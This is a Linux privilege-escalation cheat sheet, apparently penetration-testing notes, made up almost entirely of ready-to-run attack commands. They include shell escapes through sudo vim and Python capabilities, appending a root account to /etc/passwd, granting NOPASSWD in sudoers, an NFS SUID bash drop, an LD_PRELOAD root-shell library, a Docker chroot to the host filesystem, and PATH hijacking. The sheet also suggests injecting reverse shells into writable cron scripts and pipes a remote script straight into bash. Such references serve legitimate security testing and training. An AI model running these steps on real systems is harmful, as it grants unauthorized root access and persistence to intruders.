## Linux Privilege Escalation

### Enumeration First

```bash
# System info
uname -a
cat /etc/os-release
hostname

# Current user context
id
whoami
sudo -l

# Running processes
ps auxf
ps -ef

# Network
netstat -tulpn
ss -tulpn
ip a
```

---

### SUID / SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null
```

Cross-reference findings against [GTFOBins](https://gtfobins.github.io/).

---

### Sudo Misconfigurations

```bash
sudo -l
# Look for NOPASSWD entries, wildcards, or exploitable binaries
# Example: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
```

---

### Writable Files and Directories

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Writable PATH directories
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable 2>/dev/null
```

---

### Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*

# Watch for running cron jobs
# pspy is the standard tool for this without root
```

If a cron script is writable, inject a reverse shell or setuid payload.

---

### PATH Hijacking

```bash
# If a cron or SUID binary calls a command without full path:
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -i' > /tmp/curl
chmod +x /tmp/curl
```

---

### Weak File Permissions

```bash
# Readable /etc/shadow
cat /etc/shadow

# Writable /etc/passwd — append a new root user
openssl passwd -1 -salt xyz password123
echo 'newroot:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Writable sudoers
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

---

### Capabilities

```bash
getcap -r / 2>/dev/null
# Dangerous caps: cap_setuid, cap_net_raw, cap_dac_read_search
# Example: python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

### NFS No-Root-Squash

```bash
cat /etc/exports
# If no_root_squash is set on a share, mount it from attacker machine as root
# and place a SUID binary

showmount -e <target>
mount -o rw,vers=2 <target>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target:
/tmp/nfs/bash -p
```

---

### Kernel Exploits

```bash
uname -r
cat /proc/version

# Common exploits: DirtyPipe (5.8-5.16), DirtyCow (< 4.9),
# OverlayFS, Polkit CVE-2021-4034
```

Only use kernel exploits as a last resort — they can crash the system.

---

### Environment Variables / LD_PRELOAD

```bash
# If sudo preserves LD_PRELOAD:
# sudo -l shows: env_keep+=LD_PRELOAD

cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>
```

---

### Docker / LXC Escape

```bash
id  # check for docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Check if inside container
cat /.dockerenv
cat /proc/1/cgroup | grep docker
```

### Automated Enumeration Scripts

```bash
# LinPEAS
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# pspy (no-root process watcher)
./pspy64
```
